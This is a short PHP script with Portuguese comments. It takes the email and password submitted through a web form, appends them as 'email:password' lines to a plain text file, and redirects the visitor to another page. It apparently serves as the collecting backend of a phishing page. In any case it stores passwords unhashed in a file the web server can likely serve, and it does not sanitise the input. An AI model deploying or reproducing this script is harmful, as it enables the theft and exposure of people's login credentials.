<?php
// Verifica se os dados foram enviados pelo formulário
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtém os dados do formulário
    $email = $_POST['email'];
    $senha = $_POST['password'];

    // Cria ou abre o arquivo para escrita (append)
    $file = fopen("banco_de_dados.txt", "a");

    // Verifica se o arquivo foi aberto com sucesso
    if ($file) {
        // Formata os dados como "email,senha"
        $dados = $email . ":" . $senha . "\n";

        // Grava os dados no arquivo
        fwrite($file, $dados);

        // Fecha o arquivo
        fclose($file);

        // Redireciona para o link desejado após salvar os dados
        header("Location: inicio.php");
        exit; // Certifique-se de chamar exit após o header para garantir que o script pare por aqui
    } else {
        echo "Erro ao abrir o arquivo!";
    }
} else {
    echo "Nenhum dado enviado!";
}
?>
